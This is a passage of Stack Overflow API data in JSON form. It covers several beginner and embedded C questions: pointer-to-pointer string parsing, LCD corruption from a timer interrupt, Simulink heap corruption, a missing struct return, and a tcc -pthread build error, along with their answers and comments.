"question_id": 48655797, "link": "https://stackoverflow.com/questions/48655797/c-programming-how-to-access-a-single-character-from-variable-type-char/48656365#48656365", "title": "C programming: How to Access a Single Character from variable Type char**", "body": "<p>In a comment, I asked:</p>\n<blockquote>\n<p>Do you want to pass the single character <code>'H'</code>, or a pointer to it? If you want to pass a single character, you need to review the signature of <code>strcpy()</code> \u2014 it would be a mistake to pass a single character as the second argument. What do you know about dereferencing pointers?</p>\n</blockquote>\n<p>To which the response was:</p>\n<blockquote>\n<p>I know a little bit about dereferencing. It basically gathers a value from a pointer? If I use the code <code>strcpy(word, *string_ptr);</code>, I can copy the entire value of the string to the variable word.</p>\n<p>I need to be able to pass a single character; the question requires me to loop over the entire string until a non-letter character is reached, convert any uppercase letters to lowercase and then return a single word. then I'll have to do this again for the next set of letter characters in the string.</p>\n</blockquote>\n<p>And I noted:</p>\n<blockquote>\n<p>Right \u2014 <code>strcpy(word, *string_ptr)</code> will copy the string <code>&quot;Hello world&quot;</code> into the array <code>word</code>. And if you only want to copy one character from a string, consider <code>strncpy()</code>, but don't forget to null-terminate the result string. It looks like you're going to need to update the value in <code>*string_ptr</code> to allow for the characters copied to the return function \u2014 that's why it needs to be a <code>char **</code> and not just a <code>char *</code>.</p>\n</blockquote>\n<p>However, given the requirements, it is probably better not to use <code>strcpy()</code> or <code>strncpy()</code>.</p>\n<p>You could get to the <code>H</code> using <code>(*string_ptr)[0]</code> or even <code>**string_ptr</code>, but the array notation with the pointer is rather ungainly to type out very often (more than once?).  Both of them are vulnerable to crashes if the pointer in <code>(*string_ptr)</code> is a null pointer \u2014 or otherwise invalid; however, that's also true of the code below.  You could check with <code>assert(*string_ptr != NULL);</code> if you wished, and you included <code>&lt;assert.h&gt;</code>, whatever other error handling you choose.</p>\n<p>There are many options, but I'd probably use a variant on:</p>\n<pre><code>char *src = *string_ptr;   /* Starting position */\nchar *dst = word;\nint c;\n\nwhile (*src != '\\0')\n{\n    int c = (unsigned char)*src++;\n    \u2026break on space or other characters as required\u2026\n    \u2026map c as required\u2026\n    *dst++ = c;\n}\n*dst = '\\0';  /* Null terminate the string */\n*string_ptr = src;\nreturn word;\n</code></pre>\n<p>That avoids a variety of problems.  Using the local pointer <code>src</code> (the source string \u2014 matches <code>dst</code>, the destination string) avoids having to write <code>(*string_ptr)</code> all the time.  Using <code>c</code> gets ready to pass the value to the functions (macros) from <code>&lt;ctype.h&gt;</code>.  The cast to <code>(unsigned char)</code> deals with\naccented characters in a single-byte code set when the plain <code>char</code> type is signed (and is harmless when the plain <code>char</code> type is unsigned).  The increment in the loop avoids overshooting the end of the string.</p>\n"}], "owner": {"reputation": 15, "user_id": 8864197, "user_type": "registered", "profile_image": "https://graph.facebook.com/2170263616332778/picture?type=large", "display_name": "Tyler Gee", "link": "https://stackoverflow.com/users/8864197/tyler-gee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 753, "favorite_count": 0, "accepted_answer_id": 48656365, "answer_count": 1, "score": -1, "last_activity_date": 1517980949, "creation_date": 1517976146, "question_id": 48655797, "link": "https://stackoverflow.com/questions/48655797/c-programming-how-to-access-a-single-character-from-variable-type-char", "title": "C programming: How to Access a Single Character from variable Type char**", "body": "<p>I have a main here for testing that passes a simple sentence as a test. </p>\n\n<pre><code>    int main()\n{\n   char *sentence = \"Hello There.\"; /* test sentence */\n   char *word;  /* pointer to a word */\n\n  printf( \"sentence = \\\"%s\\\"\\n\", sentence );  /* show the sentence */\n\n  word = get_word( &amp;sentence );  /* this will allocate memory for a word */\n\n  printf( \"word = \\\"%s\\\"; sentence = \\\"%s\\\"\\n\", word, sentence );  /* \n  print out to see what's happening */\n\n  free(word);  /* free the memory that was allocated in get_word */\n\n  return 0;\n}\n</code></pre>\n\n<p>Here is my get_word function that requires a char** as a passing argument and must output a pointer.</p>\n\n<pre><code>char *get_word( char **string_ptr )\n{\n    char *word;\n    word = (char*)malloc(919 * sizeof(char)); /* Assign memory space for storying gathered characters */\n    strcpy(word,\"\")  /***********This is the line I need help with****/ \n\n  return word;\n}\n</code></pre>\n\n<p>This is an assignment question for a school project so cant ask for too much, my main concern is i would like to figure out how i can pass the first character 'H' of the sentence within main, to the variable word within my get_word function. Since this function is part of an assignment, I cannot change the signature. </p>\n\n<p>There is more to the question, like sorting between uppercase and lowercase, but i figure if i understand this concept I should be able to do the rest.</p>\n\n<p>Thank you for the help.</p>\n"}, {"tags": ["c", "arm", "interrupt"], "comments": [{"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "edited": false, "score": 0, "creation_date": 1517976595, "post_id": 48655783, "comment_id": 84309553, "body": "If your interrupt is being triggered while data is being sent to the LCD controller it could mess with the timing, which could easily cause communication to get out of sync and you end up with garbage data on the display. Try minimizing the amount of code that&#39;s run in the interrupt; maybe set a flag somewhere then do the work <i>after</i> you&#39;ve finished writing to the display?"}, {"owner": {"reputation": 121, "user_id": 8971063, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Jgnum.jpg?s=128&g=1", "display_name": "CNA", "link": "https://stackoverflow.com/users/8971063/cna"}, "reply_to_user": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "edited": false, "score": 0, "creation_date": 1517978875, "post_id": 48655783, "comment_id": 84310132, "body": "Hi nemequ, I have tried that too. Setting a flag for interruption function after LCD display function is executed in a loop. But the result is same. In interruption, function body is, if(flag==set) { if(condition) { Do something; } else { Do something; } } This concept works fine.  In LCD display function, update_lcd() { other lcd functions; flag=set  // for enabling interruption&#39;s function }"}, {"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "edited": false, "score": 1, "creation_date": 1517979946, "post_id": 48655783, "comment_id": 84310445, "body": "I doubt you&#39;re going to have much luck getting an answer here, then. It&#39;s hard to debug an issue like this without access to the software, much less the hardware. The first thing I&#39;d do is try to isolate exactly what triggers the problem in the software (what happens when you install an interrupt handler that does nothing), then start looking for dumb errors on the hardware side (maybe you left a pin floating or something). As a last resort, I&#39;d grab the datasheet and a scope and work my way up from there as best I could\u2026"}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 2, "creation_date": 1517981452, "post_id": 48655783, "comment_id": 84310911, "body": "Even without access to the hardware, seeing the code would be helpful. Please show it - and not in a comment. <a href=\"https://stackoverflow.com/posts/48655783/edit\">edit</a> your question for additional information. The expectation for a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> are relaxed here, but you should still provide one."}], "owner": {"reputation": 121, "user_id": 8971063, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Jgnum.jpg?s=128&g=1", "display_name": "CNA", "link": "https://stackoverflow.com/users/8971063/cna"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 73, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518109566, "creation_date": 1517976065, "last_edit_date": 1518066972, "question_id": 48655783, "link": "https://stackoverflow.com/questions/48655783/lcd-weird-characters", "title": "LCD weird characters", "body": "<p>I have been working on a project in which I need to show numeric outputs via 2x16 LCD display. Also, I am using a timer interruption in a program. Until the addition of interruption, LCD works without flaws. After I started to use interruption for proper timing maintenance, LCD display started to show weird characters.I couldn't find the proper reasons for this problem. I am using LPC2148 ARM7TDMI-S controller. Programming is developed in keil SDE. What could be the reason for this problem? \nI have added a statement that should be executed on interruption and LCD update function here.</p>\n\n<pre><code>  __irq void T0ISR(void)  // interruption function\n{\n    long int regVal;\n    regVal = T0IR; //Read current IR value\n\n\nif(RUN_STATUS == 1)\n{\nif(Input&gt;=90)\n{\n    PWMMR2 = 7500;  // T-ON=75% , Hence 75% Bright\n    PWMLER = (1&lt;&lt;2); // Update Latch Enable bit for PWMMR2\n}\n\nelse\n    {\n    PWMMR2 = 3200;  // T-ON=32% , Hence 32% Bright\n    PWMLER = (1&lt;&lt;2); // Update Latch Enable bit for PWMMR2\n    }\n\n    RUN_STATUS = RUN_OFF;    // Turn off the status in order to maintain the sync b/w displaying and interrupting\n}\n\n\nvoid update_lcd()             // update the status of LED\n{\n\n    LCD_STRING(\"S.P:  \");  \n\n     LCD_STRING(SP);     // prints setpoint in display\n\n\n   LCD_CMD(0xC0);                \n\n   LCD_STRING(Ip);             //prints input data in display\n\n     //delay(10);\n    LCD_CMD(0x01);\n\n    RUN_STATUS = RUN_ON;  // Enable interruption's function after updating LCD\n\n\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "matlab", "simulink"], "comments": [{"owner": {"reputation": 10236, "user_id": 1998377, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJV1Z.jpg?s=128&g=1", "display_name": "Phil Goddard", "link": "https://stackoverflow.com/users/1998377/phil-goddard"}, "edited": false, "score": 0, "creation_date": 1517982910, "post_id": 48655761, "comment_id": 84311372, "body": "What happens if <code>drawnow</code> is defined as <code>coder.extrinsic</code>?"}, {"owner": {"reputation": 316, "user_id": 614105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ad731a416794e79fb157c01ca1cb8b5e?s=128&d=identicon&r=PG", "display_name": "jimbo", "link": "https://stackoverflow.com/users/614105/jimbo"}, "reply_to_user": {"reputation": 10236, "user_id": 1998377, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/eJV1Z.jpg?s=128&g=1", "display_name": "Phil Goddard", "link": "https://stackoverflow.com/users/1998377/phil-goddard"}, "edited": false, "score": 0, "creation_date": 1517984105, "post_id": 48655761, "comment_id": 84311848, "body": "@PhilGoddard Thanks for the comment - I just found out my problem which I&#39;ve posted."}], "answers": [{"tags": [], "owner": {"reputation": 316, "user_id": 614105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ad731a416794e79fb157c01ca1cb8b5e?s=128&d=identicon&r=PG", "display_name": "jimbo", "link": "https://stackoverflow.com/users/614105/jimbo"}, "is_accepted": true, "score": 0, "last_activity_date": 1517984056, "creation_date": 1517984056, "answer_id": 48657124, "question_id": 48655761, "link": "https://stackoverflow.com/questions/48655761/calling-drawnow-causes-heap-corruption/48657124#48657124", "title": "Calling drawnow causes heap corruption", "body": "<p>Okay, this was silly of me. The pointers I was passing were pointing to the heap but they were pointers to pointers. The final data was sitting on the stack, so I was losing that data because of the additional function calls I introduced.</p>\n\n<p>I've properly allocated the data onto the heap now and it seems to be working now.</p>\n"}], "owner": {"reputation": 316, "user_id": 614105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ad731a416794e79fb157c01ca1cb8b5e?s=128&d=identicon&r=PG", "display_name": "jimbo", "link": "https://stackoverflow.com/users/614105/jimbo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 68, "favorite_count": 0, "accepted_answer_id": 48657124, "answer_count": 1, "score": 0, "last_activity_date": 1517984056, "creation_date": 1517975992, "question_id": 48655761, "link": "https://stackoverflow.com/questions/48655761/calling-drawnow-causes-heap-corruption", "title": "Calling drawnow causes heap corruption", "body": "<p>I'm still new to Matlab and Simulink and I'm seeing a strange problem.</p>\n\n<p>I have a series of Simulink blocks (processA, processB, etc) which are Matlab functions connected serially. They all have the same format.</p>\n\n<pre><code>function outConfig = run_processA_Fcn(inConfig)\n\ncoder.extrinsic('hilite_system');\nhilite_system('myModel/processA');\ndrawnow;\n\ncoder.extrinsic('run_processA_mex');\nrun_processA_mex(inConfig);\n\nhilite_system('myModel/processA', 'none');\ndrawnow;\n\noutConfig = inConfig;\n</code></pre>\n\n<p>The function run_processA_mex() is a .mexw64 MEX function which take in pointers to the heap (via inConfig). Inside these MEX functions I am calling my Visual Studio compiled C code (within a DLL).</p>\n\n<p>Each Simulink block could take some time to process, so I wanted it to highlight the current block. The problem is when I call drawnow, the data from my pointers change to some invalid values. The pointers themselves point to the same address, just the values they point to are wrong. If I just comment out the drawnow, my data is okay.</p>\n\n<p>I'm not clear on the best way around this. I don't know why calling drawnow would corrupt my heap. Any help would be great.</p>\n"}, {"tags": ["c", "struct", "return-value", "getter"], "comments": [{"owner": {"reputation": 550, "user_id": 3518621, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/bf3b0c525ec4ad5c29864f230486dea2?s=128&d=identicon&r=PG&f=1", "display_name": "cslrnr", "link": "https://stackoverflow.com/users/3518621/cslrnr"}, "edited": false, "score": 0, "creation_date": 1517974852, "post_id": 48655556, "comment_id": 84309123, "body": "Please check about scope of variable dfa in function DFA_new, it is local to the function"}], "answers": [{"comments": [{"owner": {"reputation": 871, "user_id": 8357969, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d947836b34ed6238d065fd26bf75662?s=128&d=identicon&r=PG&f=1", "display_name": "fstop_22", "link": "https://stackoverflow.com/users/8357969/fstop-22"}, "edited": false, "score": 0, "creation_date": 1517975070, "post_id": 48655588, "comment_id": 84309174, "body": "But the DFA created in DFA_new will go out of scope when DFA_new returns."}, {"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "reply_to_user": {"reputation": 871, "user_id": 8357969, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d947836b34ed6238d065fd26bf75662?s=128&d=identicon&r=PG&f=1", "display_name": "fstop_22", "link": "https://stackoverflow.com/users/8357969/fstop-22"}, "edited": false, "score": 1, "creation_date": 1517975090, "post_id": 48655588, "comment_id": 84309179, "body": "It returns a DFA, but since you didn&#39;t <code>return dfa;</code> from the function the DFA it returns isn&#39;t the one you initialized in the function, it&#39;s just whatever garbage was in the memory at the location of the return value. The code likely worked because that <i>happened</i> to be your dfa."}, {"owner": {"reputation": 11, "user_id": 8711391, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HZJUP.jpg?s=128&g=1", "display_name": "Jae", "link": "https://stackoverflow.com/users/8711391/jae"}, "edited": false, "score": 0, "creation_date": 1517975380, "post_id": 48655588, "comment_id": 84309251, "body": "Thank you. I feel like an idiot. I literally just started learning C yesterday so I have no clue what I&#39;m doing."}, {"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "edited": false, "score": 0, "creation_date": 1517975595, "post_id": 48655588, "comment_id": 84309311, "body": "Don&#39;t, it&#39;s an easy mistake to make. I still do it sometimes\u2026 just <b>always</b> compile with <code>-Wall</code> (and maybe <code>-Wextra</code>); the compiler can catch a lot of stuff for you if you let it."}], "tags": [], "owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "is_accepted": false, "score": 4, "last_activity_date": 1517974733, "creation_date": 1517974733, "answer_id": 48655588, "question_id": 48655556, "link": "https://stackoverflow.com/questions/48655556/additional-variable-in-struct-causes-wrong-return-value-in-getter-method/48655588#48655588", "title": "Additional variable in struct causes wrong return value in getter method", "body": "<p>You're not actually returning anything from <code>DFA_new</code>. Add a <code>return dfa;</code>, and crank up the warnings when you compile (<code>-Wall</code> for most compilers).</p>\n"}, {"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1517975452, "post_id": 48655601, "comment_id": 84309273, "body": "Or return the value of the DFA structure.  You can return copies of local structures; you can\u2019t afford to return pointers to local structures."}], "tags": [], "owner": {"reputation": 871, "user_id": 8357969, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8d947836b34ed6238d065fd26bf75662?s=128&d=identicon&r=PG&f=1", "display_name": "fstop_22", "link": "https://stackoverflow.com/users/8357969/fstop-22"}, "is_accepted": false, "score": 0, "last_activity_date": 1517974823, "creation_date": 1517974823, "answer_id": 48655601, "question_id": 48655556, "link": "https://stackoverflow.com/questions/48655556/additional-variable-in-struct-causes-wrong-return-value-in-getter-method/48655601#48655601", "title": "Additional variable in struct causes wrong return value in getter method", "body": "<p>The DFA object that you create in DFA_new goes out of scope.  You need to either malloc a pointer to a DFA object in new and return that. Or pass a pointer to a DFA object into DFA_new to initialize it.  I think you were just getting lucky first time with only two members of the struct. </p>\n"}, {"tags": [], "owner": {"reputation": 158, "user_id": 2142123, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/e744871b338f17b2bbb47c841d957ff1?s=128&d=identicon&r=PG", "display_name": "Dave", "link": "https://stackoverflow.com/users/2142123/dave"}, "is_accepted": false, "score": 0, "last_activity_date": 1517976009, "creation_date": 1517976009, "answer_id": 48655771, "question_id": 48655556, "link": "https://stackoverflow.com/questions/48655556/additional-variable-in-struct-causes-wrong-return-value-in-getter-method/48655771#48655771", "title": "Additional variable in struct causes wrong return value in getter method", "body": "<p>The problem is you are not returning a value in DFA_new.  But, actually, you also don't want to be passing structures around as arguments or as return values anyway.  Usually in C you would pass a pointer to structures so you do not have to copy the whole thing around all the time.</p>\n\n<p>This code solves the problem.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\ntypedef struct DFA {\n    int nstates;\n    int trans;\n    int ai;\n} DFA;\n\nvoid DFA_new(int nstates, DFA * dfa){\n    dfa-&gt;nstates = nstates; \n    dfa-&gt;ai = 0;\n    dfa-&gt;trans = 0;  // might as well initialize this one too\n}\n\nextern int DFA_get_size(DFA * dfa){\n    return dfa-&gt;nstates; \n}\n\nint main(){\n    DFA test;\n    DFA_new(8, &amp;test);\n    printf(\"%d\\n\", DFA_get_size(&amp;test));\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 33821, "user_id": 45685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/y4RJr.jpg?s=128&g=1", "display_name": "AndersK", "link": "https://stackoverflow.com/users/45685/andersk"}, "is_accepted": false, "score": 0, "last_activity_date": 1517978785, "creation_date": 1517978785, "answer_id": 48656183, "question_id": 48655556, "link": "https://stackoverflow.com/questions/48655556/additional-variable-in-struct-causes-wrong-return-value-in-getter-method/48656183#48656183", "title": "Additional variable in struct causes wrong return value in getter method", "body": "<p>The dfa instance in this function is local to the function, so once you leave the function it ceases to exist since you do not return it from the function.</p>\n\n<pre><code>DFA DFA_new(int nstates){\n    DFA dfa;\n    dfa.nstates = nstates; \n    dfa.ai = 0;\n    /* missing return dfa; */\n}\n</code></pre>\n\n<p>Returning a struct is not very effective since it copies the contents of the struct. There are other ways you can do this:</p>\n\n<p>Declaring the variable before passing it to DFA_new</p>\n\n<pre><code>DFA dfa;\nint myNstates = 0;\nint myAi = 0;\nDFA_New(&amp;dfa, myNstates, myAi ); // DFA_New(DFA*,int,int);\n</code></pre>\n\n<p>or allocating the DFA on the heap and passing a pointer to that element (don't forget to free it when you are done with it)</p>\n\n<pre><code>DFA* DFA_new(int nstates){\n    DFA* dfa = malloc(sizeof(*dfa));\n    if (dfa == NULL)\n    {\n       fprintf(stderr, \"No memory\\n\" );\n       abort();\n    }\n    dfa-&gt;nstates = nstates; \n    dfa-&gt;ai = 0;\n    return dfa;\n}\n\n/* then later doing free() on the returned pointer */\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 212, "user_id": 8246573, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/yHFVF.jpg?s=128&g=1", "display_name": "Paresh Dhandhukiya", "link": "https://stackoverflow.com/users/8246573/paresh-dhandhukiya"}, "is_accepted": false, "score": 0, "last_activity_date": 1517982837, "creation_date": 1517982837, "answer_id": 48656872, "question_id": 48655556, "link": "https://stackoverflow.com/questions/48655556/additional-variable-in-struct-causes-wrong-return-value-in-getter-method/48656872#48656872", "title": "Additional variable in struct causes wrong return value in getter method", "body": "<p>you are not returning DFA while creating it :</p>\n\n<pre><code>extern DFA DFA_new(int nstates){\n    DFA dfa;\n    dfa.nstates = nstates; \n    dfa.ai = 0;\n    return DFA;\n}\n</code></pre>\n\n<p>In C,local variable will be destroyed once you return from the function. since you are not returning anything, you wont get proper structure in main statement.</p>\n"}], "owner": {"reputation": 11, "user_id": 8711391, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/HZJUP.jpg?s=128&g=1", "display_name": "Jae", "link": "https://stackoverflow.com/users/8711391/jae"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "answer_count": 5, "score": 1, "last_activity_date": 1517982837, "creation_date": 1517974509, "question_id": 48655556, "link": "https://stackoverflow.com/questions/48655556/additional-variable-in-struct-causes-wrong-return-value-in-getter-method", "title": "Additional variable in struct causes wrong return value in getter method", "body": "<p>I'm very new to programming in C, but I have been using Java for years. I created a struct with two variables and a getter method (DFA_get_size) to return the value of one. However, when I added a third variable (the one commented out) the function DFA_get_size began to return the wrong number. I don't understand why this is happening. Please help.</p>\n\n<p>Below is the entire program.</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\ntypedef struct DFA {\n    int nstates;\n    //int trans;\n    int ai;\n} DFA;\n\nextern DFA DFA_new(int nstates){\n    DFA dfa;\n    dfa.nstates = nstates; \n    dfa.ai = 0;\n}\n\nextern int DFA_get_size(DFA dfa){\n    return dfa.nstates; \n}\n\nint main(){\n    DFA test = DFA_new(8);\n    printf(\"%d\\n\", DFA_get_size(test));\n}\n</code></pre>\n"}, {"tags": ["c", "gcc", "pthreads", "gtk", "tcc"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1517974390, "post_id": 48655512, "comment_id": 84309037, "body": "Look in the TCC documentation to see what <code>-pthread</code> means for your main program."}, {"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "edited": false, "score": 0, "creation_date": 1517975826, "post_id": 48655512, "comment_id": 84309373, "body": "There were some recent issues with <code>-pthread</code> in TCC. See <a href=\"http://repo.or.cz/tinycc.git/commit/3b27b3b1d1ae953f5ecb37f5bc95758499d66971\" rel=\"nofollow noreferrer\">repo.or.cz/tinycc.git/commit/&hellip;</a> and the two previous commits."}], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 12024004, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac825f7c0d95f230486d1df0e2c1f84b?s=128&d=identicon&r=PG&f=1", "display_name": "cjlp", "link": "https://stackoverflow.com/users/12024004/cjlp"}, "is_accepted": false, "score": 0, "last_activity_date": 1617151007, "creation_date": 1617151007, "answer_id": 66880122, "question_id": 48655512, "link": "https://stackoverflow.com/questions/48655512/why-does-tcc-not-recognize-main-when-i-include-the-pthreads-flag/66880122#66880122", "title": "Why does tcc not recognize &quot;main&quot; when I include the -pthreads flag?", "body": "<p>try <code>-lpthread</code></p>\n<pre class=\"lang-sh prettyprint-override\"><code>tcc hello.c -lpthread -o hello\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5984019, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XkGOZ.jpg?s=128&g=1", "display_name": "kingkoronov", "link": "https://stackoverflow.com/users/5984019/kingkoronov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 238, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1617151007, "creation_date": 1517974136, "question_id": 48655512, "link": "https://stackoverflow.com/questions/48655512/why-does-tcc-not-recognize-main-when-i-include-the-pthreads-flag", "title": "Why does tcc not recognize &quot;main&quot; when I include the -pthreads flag?", "body": "<p>I am trying to compile a c application with the gtk 3.0 library with tcc. The documentation says the command to run to compile is </p>\n\n<p><code>gcc `pkg-config --cflags gtk+-3.0` -o [executable name] [source file] `pkg-config --libs gtk+-3.0`</code> </p>\n\n<p>I am trying to use tcc to compile, and it from what I can tell, the syntax should be the same. However, where gcc compiles it fine, when I use tcc, compilation fails with the error:</p>\n\n<p><code>tcc: error: undefined symbol 'main'</code></p>\n\n<p>I isolated the problem to the -pthread flag inserted by <code>pkg-config --cflags gtk+-3.0</code> Thus, running a simple \"Hello, World\" c program and compiling with</p>\n\n<p><code>tcc -pthread -o [executable name] [source file]</code></p>\n\n<p>results in the same error. Am I compiling wrong, is it a compiler bug, or something else?</p>\n"}]